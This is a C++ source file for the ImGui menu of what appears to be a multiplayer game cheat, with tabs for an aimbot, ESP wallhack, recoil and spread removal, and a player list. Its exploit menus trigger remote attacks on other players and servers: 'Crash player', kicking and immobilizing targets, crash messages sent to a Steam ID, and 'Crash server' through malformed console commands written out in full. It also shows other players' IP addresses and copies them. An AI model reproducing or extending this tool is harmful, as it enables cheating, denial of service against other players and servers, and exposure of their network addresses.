#include "dependencies/std_include.hpp"
#include "menu.hpp"

namespace menu
{
	bool initialized = false, open = false;
	std::vector<std::string> console_items;

	void set_style_color()
	{
		auto& colors = ImGui::GetStyle().Colors;

		colors[ImGuiCol_Text] = { 1.0f, 1.0f, 1.0f, 1.0f };
		colors[ImGuiCol_TextDisabled] = { 0.784f, 0.784f, 0.784f, 0.784f };
		colors[ImGuiCol_WindowBg] = { 0.06f, 0.06f, 0.06f, 1.00f };
		colors[ImGuiCol_PopupBg] = { 0.08f, 0.08f, 0.08f, 0.94f };
		colors[ImGuiCol_Border] = { 0.00f, 0.00f, 0.00f, 0.71f };
		colors[ImGuiCol_BorderShadow] = { 0.06f, 0.06f, 0.06f, 0.01f };
		colors[ImGuiCol_FrameBg] = { 0.10f, 0.10f, 0.10f, 0.71f };
		colors[ImGuiCol_FrameBgHovered] = { 0.19f, 0.19f, 0.19f, 0.40f };
		colors[ImGuiCol_FrameBgActive] = { 0.20f, 0.20f, 0.20f, 0.67f };
		colors[ImGuiCol_TitleBg] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_TitleBgActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_TitleBgCollapsed] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_MenuBarBg] = { 0.10f, 0.10f, 0.10f, 0.66f };
		colors[ImGuiCol_ScrollbarBg] = { 0.02f, 0.02f, 0.02f, 0.00f };
		colors[ImGuiCol_ScrollbarGrab] = { 0.31f, 0.31f, 0.31f, 1.00f };
		colors[ImGuiCol_ScrollbarGrabHovered] = { 0.17f, 0.17f, 0.17f, 1.00f };
		colors[ImGuiCol_ScrollbarGrabActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_CheckMark] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_SliderGrab] = { 0.29f, 0.29f, 0.29f, 1.00f };
		colors[ImGuiCol_SliderGrabActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_Button] = { 0.10f, 0.10f, 0.10f, 1.00f };
		colors[ImGuiCol_ButtonHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ButtonActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_Header] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_HeaderHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_HeaderActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_Separator] = { 0.10f, 0.10f, 0.10f, 0.90f };
		colors[ImGuiCol_SeparatorHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_SeparatorActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ResizeGrip] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ResizeGripHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ResizeGripActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_PlotLines] = { 0.61f, 0.61f, 0.61f, 1.00f };
		colors[ImGuiCol_PlotLinesHovered] = { 1.00f, 1.00f, 1.00f, 1.00f };
		colors[ImGuiCol_PlotHistogram] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_PlotHistogramHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_TextSelectedBg] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ModalWindowDarkening] = { 0.80f, 0.80f, 0.80f, 0.35f };
	}

	void set_style()
	{
		auto& style = ImGui::GetStyle();
		ImGui::GetIO().FontDefault = ImGui::GetIO().Fonts->AddFontDefault();

		set_style_color();

		style.WindowPadding = { 8.0f, 2.0f };
		style.FramePadding = { 4.0f , 4.0f };
		style.ItemSpacing = { 10.0f, 4.0f };
		style.ItemInnerSpacing = { 4.0f, 4.0f };
		style.TouchExtraPadding = {};
		style.IndentSpacing = 21.0f;
		style.ScrollbarSize = 13.0f;
		style.GrabMinSize = 10.0f;
		style.WindowBorderSize = 0.0f;
		style.ChildBorderSize = 0.0f;
		style.PopupBorderSize = 0.0f;
		style.FrameBorderSize = 0.0f;
		style.TabBorderSize = 1.0f;

		style.WindowRounding = 7.0f;
		style.ChildRounding = 7.0f;
		style.FrameRounding = 7.0f;
		style.PopupRounding = 7.0f;
		style.ScrollbarRounding = 7.0f;
		style.GrabRounding = 7.0f;
		style.TabRounding = 7.0f;

		style.WindowTitleAlign = { 0.5f, 0.5f };
		style.WindowMenuButtonPosition = ImGuiDir_None;
		style.ButtonTextAlign = { 0.5f, 0.5f };
		style.SelectableTextAlign = {};

		style.DisplaySafeAreaPadding = { 4.0f, 4.0f };

		style.ColumnsMinSpacing = 6.0f;
		style.CurveTessellationTol = 1.25f;
		style.AntiAliasedLines = true;
	}

	void toggle()
	{
		if (initialized)
		{
			open = !open;
			utils::hook::set<bool>(game::base_address + 0x17E70335, !open);
		}
	}

	bool is_open()
	{
		return initialized && open;
	}

	bool begin_section(const std::string& text)
	{
		ImGui::TextUnformatted(text.data());
		return true;
	}

	void draw_player_list(const float width, const float spacing)
	{
		const auto draw_friend_name = [=](const game::netadr_t& target, const std::string& player_name, const std::uint64_t steam_id)
		{
			for (const auto& friends : friends::friends)
			{
				if (friends.steam_id == steam_id)
				{
					ImGui::SameLine(0, ImGui::GetStyle().ItemInnerSpacing.x);

					auto friend_name = utils::string::va("(%s)", friends.name.data());
					if (friends.name == player_name)
						friend_name = "[Friend]";

					ImGui::TextColored(ImVec4(0.0f, 0.5f, 1.0f, 0.95f), "%s", friend_name.data());
				}
			}
		}; 

		if (ImGui::BeginTabItem("Player List"))
		{
			const auto session = game::session;

			if (session == nullptr)
			{
				return;
			}
			
			const auto our_client_num = static_cast<std::uint32_t>(game::Party_FindMemberByXUID(game::LiveUser_GetXuid(0)));
			const auto in_game = game::in_game();
			
			ImGui::PushStyleVar(ImGuiStyleVar_IndentSpacing, 0.0f);
			ImGui::BeginColumns("Players", 3, ImGuiColumnsFlags_NoResize);

			ImGui::SetColumnWidth(-1, 28.0f);
			ImGui::TextUnformatted("#");
			ImGui::NextColumn();
			ImGui::TextUnformatted("Player");
			ImGui::NextColumn();
			ImGui::SetColumnOffset(-1, width - ImGui::CalcTextSize("Priority").x);
			ImGui::TextUnformatted("Priority");
			ImGui::NextColumn();

			ImGui::Separator();

			std::array<std::uint32_t, 18> indices = {};

			for (size_t i = 0; i < 18; ++i)
			{
				indices[i] = i;
			}

			if (in_game)
			{
				std::sort(indices.begin(), indices.end(), [](const auto& a, const auto& b) { return game::cg()->clients[a].team > game::cg()->clients[b].team; });
			}

			for (const auto& client_num : indices)
			{
				const auto target_client = &session->clients[client_num];
				const auto client = &game::cg()->clients[client_num];

				if (target_client->activeClient)
				{
					ImGui::AlignTextToFramePadding();
					ImGui::TextUnformatted(std::to_string(client_num).data());

					ImGui::NextColumn();

					const auto player_xuid = target_client->activeClient->fixedClientInfo.xuid;
					const auto player_name = target_client->activeClient->fixedClientInfo.gamertag;

					if (in_game)
					{
						ImGui::PushStyleColor(ImGuiCol_Text, client_num == our_client_num ? ImColor(0, 255, 127, 250).Value
							: (client->team == game::TEAM_FREE || client->team != game::cg()->clients[our_client_num].team)
							? esp::enemy_color : esp::friendly_color);
					}
					else
					{
						ImGui::PushStyleColor(ImGuiCol_Text, player_xuid == game::LiveUser_GetXuid(0)
							? ImColor(0, 255, 127, 250).Value : ImColor(200, 200, 200, 250).Value);
					}

					ImGui::AlignTextToFramePadding();

					const auto selected = ImGui::Selectable((player_name + "##"s + std::to_string(client_num)).data());

					ImGui::PopStyleColor();

					if (const auto steam_name = steam::get_friend_persona_name(player_xuid, player_name); !steam_name.empty())
					{
						ImGui::SameLine(0, spacing);
						ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "(%s)", steam_name.data());
					}

					const auto netadr = target_client->activeClient->sessionInfo[session->type].netAdr;
					const auto is_bot = netadr.type == game::NA_BOT;

					if (is_bot)
					{
						ImGui::SameLine(0, spacing);

						ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "[BOT]");
					}

					draw_friend_name(netadr, player_name, player_xuid); 
					
					const auto popup = "player_popup##" + std::to_string(client_num);
					static auto friend_player_name = ""s;

					if (selected)
					{
						friend_player_name = player_name; 
						game::oob::send_connection_test(netadr, client_num);
						
						ImGui::OpenPopup(popup.data());
					}

					const auto ip_string = utils::string::adr_to_string(&netadr);

					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
					{
						if (ImGui::BeginMenu(player_name + "##"s + std::to_string(client_num) + "player_menu"))
						{
							ImGui::MenuItem(player_name + "##"s + std::to_string(client_num) + "player_menu_item", nullptr, false, false);

							if (ImGui::IsItemClicked())
							{
								game::LiveSteam_PopOverlayForSteamID(player_xuid);
							}

							if (ImGui::IsItemHovered())
							{
								ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
							}

							if (ImGui::BeginMenu("Add to friends list##" + std::to_string(client_num)))
							{
								ImGui::InputTextWithHint("##" + std::to_string(client_num), "Name", &friend_player_name);

								if (ImGui::Button("Add friend"))
								{
									friends::friends.emplace_back(friends::friends_t{ player_xuid, friend_player_name, ip_string });
									friends::write_to_friends();
								}

								ImGui::EndMenu();
							}

							ImGui::EndMenu();
						}

						ImGui::Separator();

						if (ImGui::MenuItem(std::to_string(player_xuid)))
						{
							ImGui::LogToClipboardUnformatted(std::to_string(player_xuid));
						}

						if (ImGui::MenuItem(ip_string))
						{
							ImGui::LogToClipboardUnformatted(ip_string);
						}

						ImGui::Separator();

						const auto can_connect_to_player = game::can_connect_to_player(client_num, player_xuid);
						
						if (ImGui::MenuItem("Crash player", nullptr, nullptr, can_connect_to_player && !is_bot))
						{
							exploit::send_crash(netadr);
						}

						if (ImGui::BeginMenu("Exploits##" + std::to_string(client_num), can_connect_to_player && !is_bot))
						{
							if (ImGui::MenuItem("Show migration screen"))
							{
								exploit::send_mstart_packet(netadr);
							}

							if (ImGui::MenuItem("Immobilize"))
							{
								exploit::send_request_stats_packet(netadr);
							}

							if (ImGui::MenuItem("Remove"))
							{
								game::LobbyClientMsg_SendDisconnect(0, game::session->type, player_xuid);
							}

							if (ImGui::MenuItem("Remove from party"))
							{
								exploit::send_disconnect_client(player_xuid);
							}

							if (ImGui::MenuItem("Kick from lobby"))
							{
								exploit::send_connect_response_migration_packet(netadr);
							}

							if (ImGui::BeginMenu("Send OOB##" + std::to_string(client_num)))
							{
								static auto string_input = ""s;

								ImGui::InputTextWithHint("##" + std::to_string(client_num), "OOB", &string_input);

								if (ImGui::MenuItem("Send OOB"))
								{
									game::oob::send(netadr, string_input);
								}

								ImGui::EndMenu();
							}

							ImGui::EndMenu();
						}

						ImGui::EndPopup();
					}

					ImGui::NextColumn();

					if (client_num != our_client_num)
					{
						ImGui::TextUnformatted("");
						ImGui::SameLine(0, 10.0f);
						ImGui::Checkbox(("##priority_client" + std::to_string(client_num)).data(), reinterpret_cast<bool*>(&aimbot::priority_target[client_num]));
					}
					else
					{
						ImGui::TextUnformatted("");
					}

					ImGui::NextColumn();

					if (ImGui::GetColumnIndex() == 0)
					{
						ImGui::Separator();
					}
				}
			}

			ImGui::PopStyleVar();
			ImGui::EndColumns();
			ImGui::EndTabItem();
		}
	}

	void draw_console(const float width, const float spacing)
	{
		if (ImGui::BeginTabItem("Console"))
		{
			static ImGuiTextFilter filter;
			ImGui::TextUnformatted("Search Console");
			filter.Draw("##search_console", width * 0.85f);

			ImGui::SameLine(0.0f, spacing);
			
			if (ImGui::Button("Clear", { width * 0.15f, 0.0f }))
			{
				console_items.clear();
			}

			ImGui::Separator();

			if (ImGui::BeginChild("##console_header", {}, true, ImGuiWindowFlags_HorizontalScrollbar))
			{
				for (auto i = 0u; i != console_items.size(); ++i)
				{
					const auto item = console_items[i];

					if (!filter.PassFilter(item))
						continue;

					const auto selected = ImGui::Selectable(item + "##"s + std::to_string(i));
					const auto popup = "console_message##" + std::to_string(i);

					if (selected)
					{
						ImGui::OpenPopup(popup.data());
					}

					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
					{
						if (ImGui::MenuItem("Copy message"))
						{
							ImGui::LogToClipboardUnformatted(item);
						}

						ImGui::EndPopup();
					}
				}

				if (ImGui::GetScrollY() >= ImGui::GetScrollMaxY())
					ImGui::SetScrollHereY(1.0f);

				ImGui::EndChild();
			}

			ImGui::EndTabItem();
		}
	}

	void draw()
	{
		if (is_open())
		{
			ImGui::SetNextWindowSize({ 480, 480 }, ImGuiCond_Once);

			if (!ImGui::Begin(window_title, nullptr, window_flags))
			{
				ImGui::End();
				return;
			}

			if (ImGui::BeginTabBar("tabs"))
			{
				ImGui::Separator();

				const auto width = ImGui::GetContentRegionAvail().x;
				const auto spacing = ImGui::GetStyle().ItemInnerSpacing.x;

				if (ImGui::BeginTabItem("Aimbot"))
				{
					ImGui::Checkbox("Enabled##aimbot_enabled", &aimbot::enabled);

					ImGui::Separator();

					ImGui::Checkbox("Silent mode", &aimbot::silent);

					ImGui::SameLine(width - 100.0f, spacing);
					ImGui::Checkbox("Asynchronous", &aimbot::asynchronous);

					ImGui::Checkbox("Auto-fire", &aimbot::auto_fire);
					ImGui::Checkbox("Legit", &aimbot::legit);
					ImGui::Checkbox("Only bonescan priority targets", &aimbot::priority_bonescan);

					ImGui::EndTabItem();
				}
				
				if (ImGui::BeginTabItem("Visuals"))
				{
					ImGui::Checkbox("Enable##enable_visuals", &esp::enabled);
					ImGui::Checkbox("Enemies only", &esp::enemies_only);

					ImGui::Separator();

					ImGui::Checkbox("Player box", &esp::player_box);
					ImGui::Checkbox("Player nametag", &esp::player_name_tag);
					ImGui::Checkbox("Player bones", &esp::player_bone_tags);

					ImGui::Separator();

					ImGui::ColorEdit4("Enemy visible color", reinterpret_cast<float*>(&esp::enemy_visible_color), color_flags);
					ImGui::ColorEdit4("Enemy color", reinterpret_cast<float*>(&esp::enemy_color), color_flags);
					ImGui::ColorEdit4("Friendly color", reinterpret_cast<float*>(&esp::friendly_color), color_flags);

					ImGui::Separator();

					const auto thickness_step = 1.0f;

					ImGui::SetNextItemWidth(width * 0.20f);
					ImGui::InputScalar("Thickness", ImGuiDataType_Float, &esp::bone_thickness, &thickness_step, nullptr, "%.1f");

					esp::bone_thickness = std::fminf(std::fmaxf(esp::bone_thickness, 0.0f), 10.0f);

					if (ImGui::CollapsingHeader("Misc", ImGuiTreeNodeFlags_Leaf))
					{
						ImGui::Checkbox("Aimbot positions", &esp::aimbot_positions);
					}

					ImGui::EndTabItem();
				}
				
				if (ImGui::BeginTabItem("Misc"))
				{
					if (begin_section("Player name"))
					{
						static std::string player_name = game::LiveUser_GetClientName(0);

						ImGui::SetNextItemWidth(width * 0.45f);
						ImGui::InputTextWithHint("##player_name", "Name", &player_name);

						ImGui::SameLine();

						if (ImGui::Button("Set##set_player_name"))
						{
							steam::persona_name = player_name;
						}
					}

					ImGui::Checkbox("Log out-of-band packets", &events::connectionless_packet::log_packets);
					ImGui::Checkbox("Log instant messages", &events::instant_message::dispatch::log_messages);
					ImGui::Checkbox("Log lobby messages", &events::lobby_msg::log_messages);

					if (ImGui::CollapsingHeader("Removals", ImGuiTreeNodeFlags_Leaf))
					{
						ImGui::Checkbox("Remove kick angles", &misc::no_recoil);
						ImGui::Checkbox("Remove spread", &nospread::enabled);
					}

					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Server"))
				{
					if (ImGui::CollapsingHeader("Game settings", ImGuiTreeNodeFlags_Leaf))
					{

					}

					if (ImGui::CollapsingHeader("Exploits", ImGuiTreeNodeFlags_Leaf))
					{
						if (begin_section("Send crash"))
						{
							static auto steam_id_input = ""s;

							ImGui::SetNextItemWidth(width * 0.85f);
							ImGui::InputTextWithHint("##target_steam_id", "Steam ID", &steam_id_input);

							ImGui::SameLine();

							if (ImGui::Button("Execute##execute_crash", { 64.0f, 0.0f }))
							{
								const auto target_steam_id = utils::atoll(steam_id_input);

								if (target_steam_id)
								{
									events::instant_message::send_friend_message_crash(target_steam_id);
									events::instant_message::send_info_response_overflow(target_steam_id);
								}
							}
						}

						if (ImGui::MenuItem("Endgame"))
						{
							game::Cbuf_AddText(0, ("mr " + std::to_string(game::cl()->serverId) + " 0 endround").data());
						}
						
						if (ImGui::MenuItem("Send crash text"))
						{
							game::Cbuf_AddText(0, "callvote map \"^H\xff\xff\xff\deez\"");
						}

						if (ImGui::MenuItem("Crash server"))
						{
							game::LobbyClientMsg_SendModifiedStats(0, game::session->type);
							game::Cbuf_AddText(0, "loadside 0 deez \"balls;quit;\" 1");
						}
					}
					
					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Extras"))
				{
					if (ImGui::CollapsingHeader("Tools", ImGuiTreeNodeFlags_Leaf))
					{
						if (begin_section("Execute command"))
						{
							static auto command_input = ""s;

							ImGui::SetNextItemWidth(width * 0.85f);
							ImGui::InputTextWithHint("##command_input", "Command", &command_input);

							ImGui::SameLine();

							if (ImGui::Button("Execute##execute_command", { 64.0f, 0.0f }))
							{
								game::Cbuf_AddText(0, command_input.data());
							}
						}

						if (begin_section("Join game via steam ID"))
						{
							static auto steam_id_input = ""s;

							ImGui::SetNextItemWidth(width * 0.85f);
							ImGui::InputTextWithHint("##lobby_id_input", "Steam ID", &steam_id_input);

							ImGui::SameLine();

							if (ImGui::Button("Join##join_via_steam_id", { 64.0f, 0.0f }))
							{
								const auto command = "join " + steam_id_input;
								game::Cbuf_AddText(0, command.data());
							}
						}
					}

					ImGui::EndTabItem();
				}

				draw_player_list(width, spacing);
				friends::draw_friends_list(width, spacing);
				draw_console(width, spacing);
			}
		}
	}

	void initialize(IDXGISwapChain* swap_chain)
	{
		if (!initialized)
		{
			initialized = true;

			rendering::dx::on_frame(swap_chain);
			input::on_key(VK_F1, toggle, true);

			friends::refresh_friends();
		}
	}
}